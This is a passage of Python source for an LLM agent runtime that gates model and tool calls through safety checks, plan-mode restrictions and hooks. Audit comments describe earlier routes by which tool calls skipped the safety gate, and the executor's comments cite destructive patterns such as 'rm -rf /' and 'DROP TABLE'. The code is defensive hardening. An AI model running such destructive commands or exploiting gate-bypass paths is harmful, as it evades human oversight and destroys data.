            # WF-1: anti-forgetting turn counter
            ctx.artifact_turn_count += 1
            if ctx.artifact_turn_count % 5 == 0 and ctx.artifact_turn_count > 0:
                summary = self.artifact_manager.get_active_artifacts_context(ctx.agent_id, limit=10)
                if summary:
                    ctx.add_message(
                        "system",
                        f"[Anti-Forgetting Artifact Summary — turn {ctx.artifact_turn_count}]\n{summary}",
                    )
                    logger.info(
                        "WF-1 anti-forgetting summary injected: turn=%d agent=%s",
                        ctx.artifact_turn_count,
                        ctx.agent_id,
                    )

            context_window = getattr(self, "_context_window_override", 32768)
            artifact_result = self.artifact_manager.get_active_artifacts_context_budget_aware(
                ctx.agent_id,
                context_window=context_window,
            )
            artifact_ctx = artifact_result.get("context_text", "")
            if artifact_ctx:
                if messages and messages[0].get("role") == "system":
                    messages[0]["content"] += "\n\n" + artifact_ctx
                else:
                    messages.insert(0, {"role": "system", "content": artifact_ctx})

            artifact_mode = artifact_result.get("mode", "none")
            if artifact_mode not in ("none", "full"):
                logger.info(
                    "artifact context injection mode=%s utilization=%.2f agent=%s",
                    artifact_mode,
                    artifact_result.get("utilization", 0.0),
                    ctx.agent_id,
                )

            if artifact_mode != "none":
                try:
                    from .artifact_tools import ARTIFACT_SYSTEM_PROMPT

                    artifact_count = artifact_result.get("artifact_count", 0)
                    rendered = self.templates.render(
                        "artifact-long-text",
                        artifact_guidelines=ARTIFACT_SYSTEM_PROMPT,
                        artifact_count=artifact_count,
                        artifact_list=artifact_ctx,
                    )
                    if messages and messages[0].get("role") == "system":
                        messages[0]["content"] += "\n\n" + rendered
                    else:
                        messages.insert(0, {"role": "system", "content": rendered})
                    logger.info(
                        "AS-8 artifact-aware prompt injected: artifacts=%d mode=%s",
                        artifact_count,
                        artifact_mode,
                    )
                except (KeyError, ValueError) as e:
                    logger.warning("artifact-long-text template render failed: %s", e)

            if self.compactor and artifact_result.get("utilization", 0.0) > 0.7:
                compact_level = self.compactor.should_compact(ctx.messages)
                if compact_level != "none":
                    before_count = len(ctx.messages)
                    await self._fire_tool_hooks(
                        "PRE_COMPACT",
                        "",
                        {
                            "graph_id": graph.id,
                            "node_id": node.label or "",
                            "before": before_count,
                            "level": compact_level,
                            "reason": "artifact_utilization",
                        },
                    )
                    ctx.messages = self.compactor.compact(ctx.messages, compact_level)
                    logger.info(
                        "proactive artifact-aware compaction: mode=%s level=%s before_msgs=%d after_msgs=%d",
                        artifact_mode,
                        compact_level,
                        before_count,
                        len(ctx.messages),
                    )
                    yield AgentEvent(
                        type=AgentEventType.THINK,
                        content=f"Proactive compaction triggered (artifact budget at {artifact_result.get('utilization', 0.0):.0%})",
                        metadata={
                            "artifact_mode": artifact_mode,
                            "compact_level": compact_level,
                            "artifact_utilization": artifact_result.get("utilization", 0.0),
                        },
                    )

        if self.artifact_manager:
            artifact_system_suffix = (
                "\n\n[Artifact Guidelines]\n"
                "- Use artifact-ref IDs to reference existing artifacts rather than duplicating content.\n"
                "- Prefer incremental modification (artifact_update with operation=replace_section/append/prepend) over full content replacement.\n"
                "- For staged generation: create artifact with sections, then fill sections incrementally.\n"
                "- Use artifact_load with preview_only=true to inspect artifacts without consuming full context.\n"
                "- Use artifact_context_budget to monitor context usage before large operations.\n"
            )
            if messages and messages[0].get("role") == "system":
                messages[0]["content"] += artifact_system_suffix
            else:
                messages.insert(0, {"role": "system", "content": artifact_system_suffix.strip()})

        messages.extend(ctx.messages)

        schema_validator = None
        if node.tool_params.get("output_schema"):
            schema_validator = JsonSchemaValidator(node.tool_params["output_schema"])
            schema_instruction = schema_validator.to_instruction()
            if schema_instruction:
                if messages and messages[0].get("role") == "system":
                    messages[0]["content"] += "\n\n" + schema_instruction
                else:
                    messages.insert(0, {"role": "system", "content": schema_instruction})

        if self.safety_gateway:
            safety_result = self.safety_gateway.evaluate_action(
                category="llm_call",
                content=str(messages[-1]) if messages else "",
                context=f"model={model} node={node.label}",
            )
            if safety_result.action.value == "block" and not safety_result.requires_approval:
                ctx.error = f"SafetyGateway blocked LLM call: {safety_result.reason}"
                yield AgentEvent(
                    type=AgentEventType.SAFETY_APPROVAL,
                    content=safety_result.reason,
                    metadata={"action": "blocked", "category": "llm_call"},
                )
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return
            if safety_result.requires_approval:
                async for evt in self._await_safety_approval(
                    ctx, safety_result, "llm_call", node.label
                ):
                    yield evt
                    if evt.type == AgentEventType.ERROR:
                        return
            else:
                yield AgentEvent(
                    type=AgentEventType.SAFETY_APPROVAL,
                    content=safety_result.reason or "approved",
                    metadata={"action": "approved", "category": "llm_call"},
                )

        capability = node.tool_params.get("capability", "")
        effort = node.effort or ""

        # C13: llm.call span — 跨流/非流路径, end 时带 prompt/completion_tokens.
        llm_span = None
        if self.telemetry_engine is not None:
            try:
                llm_span = self.telemetry_engine.start_span(
                    "llm.call",
                    attributes={"model": model, "node": node.label, "stream": stream},
                )
            except Exception as e:
                logger.warning("telemetry start_span llm.call failed: %s", e)
        llm_status = "ok"
        try:
            if stream:
                content_parts: list[str] = []
                tool_calls: list[dict] = []
                usage: dict = {}
                resp_model = model
                current_tool_calls: dict[int, dict] = {}

                async for chunk in self.llm_gateway.chat_stream(
                    messages=messages,
                    model=model,
                    capability=capability,
                    tools=tools_schema if tools_schema else None,
                    max_tokens=node.max_tokens,
                    temperature=node.temperature,
                    effort=effort or None,
                    tool_choice=node.tool_choice or None,
                ):
                    delta_content = chunk.get("delta_content", "")
                    delta_tool_calls = chunk.get("delta_tool_calls")
                    finish_reason = chunk.get("finish_reason")

                    if delta_content:
                        content_parts.append(delta_content)
                        yield AgentEvent(
                            type=AgentEventType.TOKEN,
                            content=delta_content,
                            node_id=node.label,
                        )

                    if delta_tool_calls:
                        for dtc in delta_tool_calls:
                            idx = dtc.get("index", 0)
                            if idx not in current_tool_calls:
                                current_tool_calls[idx] = {
                                    "id": dtc.get("id", f"call_{idx}"),
                                    "type": "function",
                                    "function": {"name": "", "arguments": ""},
                                }
                            tc = current_tool_calls[idx]
                            if dtc.get("id"):
                                tc["id"] = dtc["id"]
                            func_delta = dtc.get("function", {})
                            if func_delta.get("name"):
                                tc["function"]["name"] += func_delta["name"]
                            if func_delta.get("arguments"):
                                tc["function"]["arguments"] += func_delta["arguments"]

                    if chunk.get("usage"):
                        usage = chunk["usage"]
                    if finish_reason:
                        if chunk.get("model"):
                            resp_model = chunk["model"]

                content = "".join(content_parts)
                tool_calls = list(current_tool_calls.values()) if current_tool_calls else []
                for tc in tool_calls:
                    args_str = tc.get("function", {}).get("arguments", "")
                    if args_str:
                        try:
                            json.loads(args_str)
                        except json.JSONDecodeError:
                            logger.warning(
                                "streaming tool_use incomplete arguments for %s, "
                                "falling back to non-streaming",
                                tc.get("function", {}).get("name", "?"),
                            )
                            try:
                                gw_resp = await asyncio.wait_for(
                                    self.llm_gateway.chat(
                                        messages=messages,
                                        model=model,
                                        capability=capability,
                                        tools=tools_schema if tools_schema else None,
                                        max_tokens=node.max_tokens,
                                        temperature=node.temperature,
                                        effort=effort or None,
                                    ),
                                    timeout=120.0,
                                )
                                content = gw_resp.content or ""
                                tool_calls = gw_resp.tool_calls or []
                                if gw_resp.usage:
                                    usage = gw_resp.usage
                                if gw_resp.model:
                                    resp_model = gw_resp.model
                            except Exception as fallback_exc:
                                logger.error(
                                    "fallback non-streaming also failed: %s",
                                    fallback_exc,
                                )
            else:
                logger.debug("LLM call via gateway, model=%s", model)
                gw_resp = await asyncio.wait_for(
                    self.llm_gateway.chat(
                        messages=messages,
                        model=model,
                        capability=capability,
                        tools=tools_schema if tools_schema else None,
                        max_tokens=node.max_tokens,
                        temperature=node.temperature,
                        effort=effort or None,
                        tool_choice=node.tool_choice or None,
                    ),
                    timeout=120.0,
                )
                if gw_resp.finish_reason == "error" and gw_resp.usage.get("error"):
                    raise RuntimeError(gw_resp.usage["error"])
                content = gw_resp.content
                tool_calls = gw_resp.tool_calls or []
                usage = gw_resp.usage
                resp_model = gw_resp.model or model
        except Exception as e:
            ctx.error = f"LLM call failed: {e}"
            llm_status = "error"
            yield AgentEvent(type=AgentEventType.ERROR, content=str(e))
            return

        # C13: end llm.call span — 计数+延迟+token 用量入属性.
        if llm_span is not None and self.telemetry_engine is not None:
            try:
                if isinstance(usage, dict):
                    llm_span.attributes["prompt_tokens"] = usage.get("prompt_tokens", 0)
                    llm_span.attributes["completion_tokens"] = usage.get(
                        "completion_tokens", 0
                    )
                self.telemetry_engine.end_span(llm_span.span_id, status=llm_status)
            except Exception as e:
                logger.warning("telemetry end_span llm.call failed: %s", e)

        if schema_validator and content:
            extracted = schema_validator.extract_from_text(content)
            if extracted:
                errors = schema_validator.validate(extracted)
                if not errors:
                    content = json.dumps(extracted, ensure_ascii=False)
                    ctx.variables.set("structured_output", extracted)
                else:
                    logger.warning("Structured output schema validation failed: %s", errors)
            else:
                logger.warning("Structured output: could not extract JSON from LLM response")

        ctx.add_message("assistant", content, tool_calls=tool_calls or None, usage=usage or None)

        # WF-2: truncation detection — unclosed artifact tags
        if content and self.artifact_manager:
            unclosed = self._detect_unclosed_artifacts(content)
            if unclosed:
                bp = self._extract_breakpoint(content)
                for aid in unclosed:
                    ctx.add_message(
                        "system",
                        f"[Truncation Recovery] artifact(id:{aid}) output interrupted. "
                        f"Breakpoint: {bp}. Continue from breakpoint — do NOT regenerate from scratch.",
                    )
                logger.warning(
                    "WF-2 truncation detected: unclosed_artifacts=%s breakpoint='%s'",
                    unclosed,
                    bp[:80],
                )

        if usage.get("prompt_tokens") or usage.get("completion_tokens"):
            if ctx.messages:
                last_msg = ctx.messages[-1]
                if isinstance(last_msg, dict):
                    last_msg["usage"] = usage

        yield AgentEvent(
            type=AgentEventType.THINK,
            content=content,
            node_id=node.label,
            metadata={
                "model": resp_model,
                "temperature": node.temperature,
                "usage": usage,
            },
        )

        if tool_calls:
            ctx.tool_call_chain_count += 1
            if ctx.tool_call_chain_count > _MAX_TOOL_CALL_CHAIN:
                ctx.error = f"Tool call chain exceeded {_MAX_TOOL_CALL_CHAIN}"
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return

            tool_errors: list[str] = []

            # C1 parallel_tool_calls: 预解析 + 控制流工具检测。
            # 并行仅当 parallel_tool_calls=True 且 plan_mode 关 (敏感门禁需顺序)
            # 且无控制流工具 (__sub_graph__/register_tool/unregister_tool/exit_plan_mode)。
            # 混合或门禁态 -> 回退现有顺序循环 (向后兼容, 零风险)。
            _control_flow_tools = {
                "__sub_graph__",
                "register_tool",
                "unregister_tool",
                "exit_plan_mode",
            }
            can_parallel = bool(node.parallel_tool_calls) and not ctx.plan_mode
            parsed_calls: list[tuple[str, dict, str]] = []
            if can_parallel:
                for tc in tool_calls:
                    try:
                        fn = tc["function"]["name"]
                        fa = json.loads(tc["function"]["arguments"])
                    except (KeyError, json.JSONDecodeError) as e:
                        ctx.error = f"Invalid tool call: {e}"
                        yield AgentEvent(type=AgentEventType.ERROR, content=str(e))
                        return
                    if fn in _control_flow_tools:
                        can_parallel = False
                        break
                    parsed_calls.append((fn, fa, tc.get("id", "")))

            if can_parallel and parsed_calls:
                # 并行路径: 先发所有 TOOL_CALL, gather 执行, 按输入序发 TOOL_RESULT。
                for fn, fa, _tcid in parsed_calls:
                    yield AgentEvent(
                        type=AgentEventType.TOOL_CALL,
                        name=fn,
                        args=fa,
                        node_id=node.label,
                    )
                results = await asyncio.gather(
                    *(self._exec_parallel_tool(node, fn, fa) for fn, fa, _tcid in parsed_calls)
                )
                for (fn, fa, tcid), res in zip(parsed_calls, results):
                    result_str, is_error = res
                    ctx.add_message("tool", result_str, tool_call_id=tcid)
                    ctx.messages[-1]["_node_id"] = node.label
                    post_event = "POST_TOOL_USE_FAILURE" if is_error else "POST_TOOL_USE"
                    await self._fire_tool_hooks(post_event, fn, fa, result_str)
                    yield AgentEvent(
                        type=AgentEventType.TOOL_RESULT,
                        content=result_str,
                        name=fn,
                        node_id=node.label,
                    )
                    if is_error:
                        tool_errors.append(f"{fn}: {result_str}")
            else:
                for tc in tool_calls:
                    try:
                        func_name = tc["function"]["name"]
                        func_args = json.loads(tc["function"]["arguments"])
                    except (KeyError, json.JSONDecodeError) as e:
                        ctx.error = f"Invalid tool call: {e}"
                        yield AgentEvent(type=AgentEventType.ERROR, content=str(e))
                        return

                    # C6 plan-as-mode: gate write tools during read-only explore.
                    # exit_plan_mode is the transition primitive (handled below).
                    if (
                        ctx.plan_mode
                        and func_name != "exit_plan_mode"
                        and func_name not in self._plan_readonly_tools
                    ):
                        result = (
                            f"Blocked: plan_mode is active (read-only explore). "
                            f"Tool '{func_name}' writes state. Present your plan, "
                            f"then call exit_plan_mode to transition to execution."
                        )
                        logger.info(
                            "plan_mode blocked write tool=%s node=%s",
                            func_name,
                            node.label,
                        )
                        ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                        yield AgentEvent(
                            type=AgentEventType.TOOL_RESULT,
                            content=result,
                            name=func_name,
                            node_id=node.label,
                            metadata={"plan_mode_blocked": True},
                        )
                        continue

                    if func_name == "__sub_graph__":
                        async for event in self._execute_sub_graph(ctx, func_args, node):
                            yield event
                        continue

                    if func_name == "register_tool":
                        result = self._dynamic_register_tool(func_args)
                        ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                        yield AgentEvent(
                            type=AgentEventType.TOOL_RESULT,
                            content=result,
                            name=func_name,
                            node_id=node.label,
                        )
                        continue

                    if func_name == "unregister_tool":
                        result = self._dynamic_unregister_tool(func_args)
                        ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                        yield AgentEvent(
                            type=AgentEventType.TOOL_RESULT,
                            content=result,
                            name=func_name,
                            node_id=node.label,
                        )
                        continue

                    yield AgentEvent(
                        type=AgentEventType.TOOL_CALL,
                        name=func_name,
                        args=func_args,
                        node_id=node.label,
                    )

                    pre = await self._fire_tool_hooks("PRE_TOOL_USE", func_name, func_args)
                    if pre is not None and pre.decision == "block":
                        result = f"Blocked by hook: {pre.reason or 'pre_tool_use'}"
                        logger.info(
                            "tool blocked by hook tool=%s reason=%s",
                            func_name,
                            pre.reason,
                        )
                        ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                        yield AgentEvent(
                            type=AgentEventType.TOOL_RESULT,
                            content=result,
                            name=func_name,
                            node_id=node.label,
                        )
                        continue

                    # 审计 D-2: LLM function-call 路径补 safety gate. 原仅
                    # tool-node 路径 (2008) 过 evaluate_action, LLM 直接
                    # 调工具完全绕过 SafetyGateway L3 内容检查 — LLM 可在
                    # 单轮内串 shell/网络/写入. 在此与 tool-node 路径对齐:
                    # category=tool_call, block/approval/approved 三态一致.
                    if self.safety_gateway:
                        safety_result = self.safety_gateway.evaluate_action(
                            category="tool_call",
                            content=f"{func_name}({func_args})",
                            context=f"tool={func_name} node={node.label} path=llm_func_call",
                        )
                        if safety_result.action.value == "block" and not safety_result.requires_approval:
                            result = f"SafetyGateway blocked tool call: {safety_result.reason}"
                            logger.warning(
                                "safety blocked llm_func_call tool=%s node=%s reason=%s",
                                func_name,
                                node.label,
                                safety_result.reason,
                            )
                            ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                            yield AgentEvent(
                                type=AgentEventType.SAFETY_APPROVAL,
                                content=safety_result.reason,
                                metadata={"action": "blocked", "category": "tool_call"},
                                node_id=node.label,
                            )
                            yield AgentEvent(
                                type=AgentEventType.TOOL_RESULT,
                                content=result,
                                name=func_name,
                                node_id=node.label,
                            )
                            continue
                        if safety_result.requires_approval:
                            async for evt in self._await_safety_approval(
                                ctx, safety_result, "tool_call", node.label
                            ):
                                yield evt
                                if evt.type == AgentEventType.ERROR:
                                    break
                        else:
                            yield AgentEvent(
                                type=AgentEventType.SAFETY_APPROVAL,
                                content=safety_result.reason or "approved",
                                metadata={"action": "approved", "category": "tool_call"},
                                node_id=node.label,
                            )

                    # C13: tool.call span — 计数+延迟. 在 try 之前初始化,
                    # KeyError(tool 不存在)在 start_span 之前抛出时 except 仍安全.
                    tool_span = None
                    try:
                        tool = self.tools.get(func_name)
                        if tool is None:
                            raise KeyError(func_name)
                        validated_args = self._validate_tool_args(tool, func_args)
                        validated_args = self._merge_tool_config_defaults(func_name, validated_args)
                        if self.telemetry_engine is not None:
                            try:
                                tool_span = self.telemetry_engine.start_span(
                                    "tool.call",
                                    attributes={"tool": func_name, "node": node.label},
                                )
                            except Exception as e:
                                logger.warning("telemetry start_span tool.call failed: %s", e)
                        result = await tool.execute(**validated_args)
                        if tool_span is not None and self.telemetry_engine is not None:
                            try:
                                self.telemetry_engine.end_span(tool_span.span_id, status="ok")
                            except Exception as e:
                                logger.warning("telemetry end_span tool.call failed: %s", e)
                    except KeyError:
                        result = f"Error: Tool '{func_name}' not found"
                        if tool_span is not None and self.telemetry_engine is not None:
                            try:
                                self.telemetry_engine.end_span(tool_span.span_id, status="error")
                            except Exception as e:
                                logger.warning("telemetry end_span tool.call failed: %s", e)
                    except Exception as e:
                        result = f"Error: {e}"
                        if tool_span is not None and self.telemetry_engine is not None:
                            try:
                                self.telemetry_engine.end_span(tool_span.span_id, status="error")
                            except Exception as e:
                                logger.warning("telemetry end_span tool.call failed: %s", e)

                    # C6: detect exit_plan_mode sentinel -> flip plan_mode off.
                    # The tool returns the sentinel prefix + plan content; we strip
                    # the sentinel so the stored message is the clean plan text.
                    if (
                        func_name == "exit_plan_mode"
                        and isinstance(result, str)
                        and result.startswith(EXIT_PLAN_MODE_SENTINEL)
                    ):
                        plan_text = result[len(EXIT_PLAN_MODE_SENTINEL) :]
                        ctx.plan_mode = False
                        result = f"Plan approved. Transitioning to execution.\n{plan_text}"
                        logger.info(
                            "exit_plan_mode: plan_mode->False node=%s plan_len=%d",
                            node.label,
                            len(plan_text),
                        )
                        ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                        ctx.messages[-1]["_node_id"] = node.label
                        yield AgentEvent(
                            type=AgentEventType.PLAN_MODE_EXIT,
                            content=plan_text,
                            name="exit_plan_mode",
                            node_id=node.label,
                            metadata={"plan_mode": False},
                        )
                        continue

                    ctx.add_message("tool", result, tool_call_id=tc.get("id", ""))
                    ctx.messages[-1]["_node_id"] = node.label

                    post_event = (
                        "POST_TOOL_USE_FAILURE"
                        if str(result).startswith("Error:")
                        else "POST_TOOL_USE"
                    )
                    await self._fire_tool_hooks(post_event, func_name, func_args, str(result))

                    yield AgentEvent(
                        type=AgentEventType.TOOL_RESULT,
                        content=str(result),
                        name=func_name,
                        node_id=node.label,
                    )

                    if str(result).startswith("Error:"):
                        tool_errors.append(f"{func_name}: {result}")

            # 审计 L-2: LLM function-call 路径 stop_on_tool_error. 直接 tool
            # 节点路径 (2082) 在工具出错且 graph.stop_on_tool_error=True 时
            # set ctx.error + 发 ERROR + return 停级联; 但本 LLM 路径只把
            # 错误塞进 tool_errors 然后继续走 retry_on_error, 从不尊重
            # stop_on_tool_error — 节点级开关在 LLM 驱动路径静默失效.
            if tool_errors and getattr(graph, "stop_on_tool_error", False):
                ctx.error = (
                    f"Tool errors in LLM node '{node.label}': "
                    + "; ".join(tool_errors)
                )
                logger.warning(
                    "llm_func_call errors stop cascade (stop_on_tool_error=True) "
                    "node=%s errors=%s",
                    node.label,
                    "; ".join(tool_errors)[:200],
                )
                yield AgentEvent(
                    type=AgentEventType.ERROR,
                    content=ctx.error,
                    node_id=node.label,
                    metadata={"tool_error": True, "node": node.label},
                )
                return

            if tool_errors and node.retry_on_error and node.max_retries > 0:
                max_retries = min(node.max_retries, 5)
                for retry_count in range(1, max_retries + 1):
                    logger.info(
                        "Self-repair retry %d/%d for node=%s",
                        retry_count,
                        max_retries,
                        node.label,
                    )
                    yield AgentEvent(
                        type=AgentEventType.RETRY,
                        content=f"Retrying due to tool errors (attempt {retry_count}/{max_retries})",
                        metadata={"retry_count": retry_count, "errors": tool_errors},
                        node_id=node.label,
                    )

                    retry_prompt = (
                        "[Self-repair] The previous tool calls failed:\n"
                        + "\n".join(f"- {e}" for e in tool_errors)
                        + "\n\nPlease try again with corrected arguments or a different approach."
                    )
                    ctx.add_message("system", retry_prompt)

                    # 审计 D-4: self-repair 路径的 LLM 调用原本完全脱离
                    # safety_gateway — 主 LLM 节点路径 (1055) 过
                    # category=llm_call, 自愈重试却裸调 gateway, L3 内容
                    # 检查在此静默失效. 补 gate, 与主路径一致.
                    if self.safety_gateway:
                        safety_result = self.safety_gateway.evaluate_action(
                            category="llm_call",
                            content=retry_prompt,
                            context=f"model={model} node={node.label} path=self_repair",
                        )
                        if safety_result.action.value == "block" and not safety_result.requires_approval:
                            ctx.error = f"SafetyGateway blocked self-repair LLM call: {safety_result.reason}"
                            yield AgentEvent(
                                type=AgentEventType.SAFETY_APPROVAL,
                                content=safety_result.reason,
                                metadata={"action": "blocked", "category": "llm_call", "path": "self_repair"},
                                node_id=node.label,
                            )
                            yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error, node_id=node.label)
                            return
                        if safety_result.requires_approval:
                            async for evt in self._await_safety_approval(
                                ctx, safety_result, "llm_call", node.label
                            ):
                                yield evt
                                if evt.type == AgentEventType.ERROR:
                                    return
                        else:
                            yield AgentEvent(
                                type=AgentEventType.SAFETY_APPROVAL,
                                content=safety_result.reason or "approved",
                                metadata={"action": "approved", "category": "llm_call", "path": "self_repair"},
                                node_id=node.label,
                            )

                    try:
                        gw_resp = await asyncio.wait_for(
                            self.llm_gateway.chat(
                                messages=messages + ctx.messages[-_MAX_RETRY_CONTEXT_MESSAGES:],
                                model=model,
                                capability=node.tool_params.get("capability", ""),
                                tools=tools_schema if tools_schema else None,
                                max_tokens=node.max_tokens,
                                temperature=node.temperature,
                                effort=node.effort or None,
                                tool_choice=node.tool_choice or None,
                            ),
                            timeout=120.0,
                        )
                    except Exception as e:
                        logger.warning(
                            "Self-repair LLM call failed on retry %d: %s",
                            retry_count,
                            e,
                        )
                        continue

                    retry_content = gw_resp.content
                    retry_tool_calls = gw_resp.tool_calls or []
                    ctx.add_message("assistant", retry_content, tool_calls=retry_tool_calls or None)

                    if not retry_tool_calls:
                        yield AgentEvent(
                            type=AgentEventType.RETRY_SUCCESS,
                            content=f"Self-repair succeeded on attempt {retry_count} (no more tool calls)",
                            metadata={"retry_count": retry_count},
                            node_id=node.label,
                        )
                        break

                    tool_errors = []
                    for tc in retry_tool_calls:
                        try:
                            fn = tc["function"]["name"]
                            fa = json.loads(tc["function"]["arguments"])
                        except (KeyError, json.JSONDecodeError):
                            continue

                        yield AgentEvent(
                            type=AgentEventType.TOOL_CALL,
                            name=fn,
                            args=fa,
                            node_id=node.label,
                        )
                        # 审计 D-4: self-repair 重试的工具执行原本完全绕过
                        # plan_mode 门禁与 safety_gateway L3 — 主 LLM 路径
                        # 的 plan_mode 块 (1350) 与 D-2 的 tool_call gate 在
                        # 此都不生效. 补齐: plan_mode 只读期挡写工具, L3
                        # 内容检查走 tool_call category.
                        if (
                            ctx.plan_mode
                            and fn != "exit_plan_mode"
                            and fn not in self._plan_readonly_tools
                        ):
                            r = (
                                "Blocked: plan_mode active (read-only explore). "
                                "Tool writes state; call exit_plan_mode first."
                            )
                            logger.info(
                                "plan_mode blocked self-repair tool=%s node=%s",
                                fn,
                                node.label,
                            )
                            ctx.add_message("tool", r, tool_call_id=tc.get("id", ""))
                            yield AgentEvent(
                                type=AgentEventType.TOOL_RESULT,
                                content=r,
                                name=fn,
                                node_id=node.label,
                                metadata={"plan_mode_blocked": True},
                            )
                            tool_errors.append(f"{fn}: {r}")
                            continue
                        if self.safety_gateway:
                            sr = self.safety_gateway.evaluate_action(
                                category="tool_call",
                                content=f"{fn}({fa})",
                                context=f"tool={fn} node={node.label} path=self_repair",
                            )
                            if sr.action.value == "block" and not sr.requires_approval:
                                r = f"SafetyGateway blocked tool call: {sr.reason}"
                                logger.warning(
                                    "safety blocked self_repair tool=%s node=%s reason=%s",
                                    fn,
                                    node.label,
                                    sr.reason,
                                )
                                ctx.add_message("tool", r, tool_call_id=tc.get("id", ""))
                                yield AgentEvent(
                                    type=AgentEventType.SAFETY_APPROVAL,
                                    content=sr.reason,
                                    metadata={"action": "blocked", "category": "tool_call", "path": "self_repair"},
                                    node_id=node.label,
                                )
                                yield AgentEvent(
                                    type=AgentEventType.TOOL_RESULT,
                                    content=r,
                                    name=fn,
                                    node_id=node.label,
                                )
                                tool_errors.append(f"{fn}: {r}")
                                continue
                            if sr.requires_approval:
                                async for evt in self._await_safety_approval(
                                    ctx, sr, "tool_call", node.label
                                ):
                                    yield evt
                                    if evt.type == AgentEventType.ERROR:
                                        return
                            else:
                                yield AgentEvent(
                                    type=AgentEventType.SAFETY_APPROVAL,
                                    content=sr.reason or "approved",
                                    metadata={"action": "approved", "category": "tool_call", "path": "self_repair"},
                                    node_id=node.label,
                                )
                        try:
                            t = self.tools.get(fn)
                            if t is None:
                                raise KeyError(fn)
                            r = await t.execute(**self._validate_tool_args(t, fa))
                        except Exception as e:
                            r = f"Error: {e}"

                        ctx.add_message("tool", str(r), tool_call_id=tc.get("id", ""))
                        yield AgentEvent(
                            type=AgentEventType.TOOL_RESULT,
                            content=str(r),
                            name=fn,
                            node_id=node.label,
                        )
                        if str(r).startswith("Error:"):
                            tool_errors.append(f"{fn}: {r}")

                    if not tool_errors:
                        yield AgentEvent(
                            type=AgentEventType.RETRY_SUCCESS,
                            content=f"Self-repair succeeded on attempt {retry_count}",
                            metadata={"retry_count": retry_count},
                            node_id=node.label,
                        )
                        break

    async def _exec_parallel_tool(
        self, node: NodeConfig, func_name: str, func_args: dict
    ) -> tuple[str, bool]:
        # C1 并行工具执行: 验参 + 配置默认 + execute, 返回 (result_str, is_error)。
        # 审计 E-3/P0-3: 旧并行路径跳过 PRE_TOOL_USE hook + SafetyGateway L3 内容
        # 检查 — parallel_tool_calls=True 可绕过 shell/网络/写入门, RCE 向量.
        # 现在此处与顺序路径 (llm_func_call 1434-1497) 对齐:
        #   1. PRE_TOOL_USE hook — block 决策直接返回 blocked 结果
        #   2. SafetyGateway evaluate_action(category=tool_call) — 内容匹配危险
        #      模式 (rm -rf / / DROP TABLE) -> block; L2/L3 需审批 -> fail-closed
        #      (并行无法 yield 审批流), 返回 error 促使 LLM 回退顺序审批路径.
        pre = await self._fire_tool_hooks("PRE_TOOL_USE", func_name, func_args)
        if pre is not None and pre.decision == "block":
            blocked = f"Blocked by hook: {pre.reason or 'pre_tool_use'}"
            logger.info(
                "parallel tool blocked by hook tool=%s reason=%s",
                func_name,
                pre.reason,
            )
            return blocked, True
        if self.safety_gateway:
            safety_result = self.safety_gateway.evaluate_action(
                category="tool_call",
                content=f"{func_name}({func_args})",
                context=f"tool={func_name} node={node.label} path=parallel",
            )
            if safety_result.action.value == "block":
                # 内容匹配危险模式 (rm -rf / / DROP TABLE) 或无 policy
                # fail-closed: 并行路径硬 block, 不可审批 (并行无审批流).
                blocked = f"SafetyGateway blocked parallel tool: {safety_result.reason}"
                logger.warning(
                    "safety blocked parallel tool=%s node=%s reason=%s",
                    func_name,
                    node.label,
                    safety_result.reason,
                )
                return blocked, True
            if safety_result.requires_approval:
                return (
                    f"Error: tool '{func_name}' requires approval; "
                    f"parallel path cannot pause for approval, retry sequentially",
                    True,
                )
        try:
            tool = self.tools.get(func_name)
            if tool is None:
                raise KeyError(func_name)
            validated_args = self._validate_tool_args(tool, func_args)
            validated_args = self._merge_tool_config_defaults(func_name, validated_args)
            result = await tool.execute(**validated_args)
        except KeyError:
            result = f"Error: Tool '{func_name}' not found"
        except Exception as e:
            result = f"Error: {e}"
        result_str = str(result)
        is_error = result_str.startswith("Error:")
        if is_error:
            logger.warning(
                "parallel tool error tool=%s node=%s err=%s",
                func_name,
                node.label,
                result_str[:120],
            )
        return result_str, is_error

    async def _fire_tool_hooks(
        self, event: str, tool_name: str, args: dict, result: str | None = None
    ):
        if self.hooks is None:
            return None
        payload = {"tool_name": tool_name, "args": args}
        if result is not None:
            payload["result"] = result
        try:
            return await self.hooks.fire(event, payload, tool_name=tool_name)
        except Exception as e:
            logger.warning("hook fire error event=%s tool=%s err=%s", event, tool_name, e)
            return None

    def _validate_tool_args(self, tool: "BaseTool", args: dict) -> dict:
        schema = tool.parameters
        if not schema:
            return args
        validated = {}
        for key, value in args.items():
            if key not in schema:
                logger.warning("Tool '%s': unexpected arg '%s' dropped", tool.name, key)
                continue
            prop = schema[key]
            expected_type = prop.get("type", "")
            if expected_type == "string" and not isinstance(value, str):
                validated[key] = str(value)
                logger.warning("Tool '%s': coerced arg '%s' to string", tool.name, key)
            elif expected_type == "number" and not isinstance(value, (int, float)):
                try:
                    validated[key] = float(value)
                except (ValueError, TypeError):
                    validated[key] = value
                    logger.warning("Tool '%s': could not coerce arg '%s' to number", tool.name, key)
            elif expected_type == "integer" and not isinstance(value, int):
                try:
                    validated[key] = int(value)
                except (ValueError, TypeError):
                    validated[key] = value
                    logger.warning(
                        "Tool '%s': could not coerce arg '%s' to integer",
                        tool.name,
                        key,
                    )
            elif expected_type == "boolean" and not isinstance(value, bool):
                validated[key] = bool(value)
                logger.warning("Tool '%s': coerced arg '%s' to boolean", tool.name, key)
            else:
                validated[key] = value
        for req_key in (
            tool.openai_schema().get("function", {}).get("parameters", {}).get("required", [])
        ):
            if req_key not in validated:
                logger.warning("Tool '%s': missing required arg '%s'", tool.name, req_key)
        return validated

    @staticmethod
    def _dynamic_tool_schemas() -> list[dict]:
        return [
            {
                "type": "function",
                "function": {
                    "name": "register_tool",
                    "description": "Register a new tool dynamically during execution. Creates a tool that can be used in subsequent steps.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "name": {
                                "type": "string",
                                "description": "Unique name for the tool",
                            },
                            "type": {
                                "type": "string",
                                "description": "Tool type (all types use safe subprocess execution)",
                                "default": "custom",
